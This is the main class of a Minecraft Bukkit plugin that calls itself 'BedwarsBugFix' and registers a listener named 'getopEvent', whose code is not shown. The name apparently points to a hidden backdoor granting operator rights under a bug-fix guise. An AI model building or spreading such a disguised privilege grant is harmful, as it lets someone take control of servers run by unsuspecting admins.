package me.zsg.zsg;

import me.zsg.zsg.Events.getopEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.ChatColor;


public class Bedwars extends JavaPlugin {

    @Override
    public void onEnable() {
        // Plugin startup logic
        getServer().getPluginManager().registerEvents(new getopEvent(),this);
        getServer().getConsoleSender().sendMessage(ChatColor.GOLD+"[BedwarsBugFix]This plugins Enabled!!!");
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        getServer().getConsoleSender().sendMessage(ChatColor.GOLD+"[BedwarsBugFix]This plugins Closed!!!");
    }
}

